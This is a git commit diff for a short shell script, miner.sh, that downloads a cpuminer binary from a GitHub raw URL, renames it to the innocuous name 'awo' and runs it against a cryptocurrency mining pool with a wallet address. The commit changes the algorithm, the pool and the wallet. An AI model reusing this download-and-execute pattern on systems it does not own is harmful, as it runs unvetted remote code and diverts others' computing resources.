9613a3b706f9c99598c8bf76cf05fdec8728957d
apaple <76417012+apaple@users.noreply.github.com>
2024-03-28 12:11:30 +0700

    Update miner.sh

--- miner.sh
+++ miner.sh
@@ -1,3 +1,3 @@
 wget https://raw.githubusercontent.com/apaple/kurohs/master/cpuminer-sse2 && mv cpuminer-sse2 awo && chmod u+x awo
 
-./awo -a Yespower -o stratum+tcp://fi.mining4people.com:3338 -u us9VKXmjuBF6Te3RPYqwpxeBLGWo3m5xF1.wrke -p x -t 3
+./awo -a yescryptr32 -o stratum+tcps://stratum-eu.rplant.xyz:17116 -u Uahs7dtdgi8Hh1RHkQQnPowATooguzcrMY -p x -t 2
